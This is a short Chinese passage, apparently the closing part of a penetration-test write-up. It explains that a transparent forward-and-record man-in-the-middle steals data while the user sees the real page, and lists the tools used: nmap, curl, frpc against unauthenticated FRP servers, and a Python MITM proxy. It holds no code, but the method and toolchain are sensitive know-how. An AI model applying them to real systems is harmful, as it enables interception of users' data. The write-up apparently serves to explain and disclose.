4. **中间人攻击不需要替换页面**。很多人以为中间人攻击需要"提供一个假页面"，实际上最危险的中间人是"透明转发+记录"模式——用户看到的是真实页面，完全正常，但数据被偷走了。

### 10.3 工具链

| 工具 | 用途 |
|------|------|
| nmap | 端口扫描、服务识别 |
| curl | HTTP 请求测试、Host 头操控 |
| frpc (v0.61.1) | FRP 客户端，连接无认证的 FRP 服务器 |
| Python (http.server) | MITM 代理，拦截和转发 HTTP 请求 |
| Python (json) | 解析 Source Map |
| grep / ripgrep | 源码搜索（API 端点、硬编码值） |
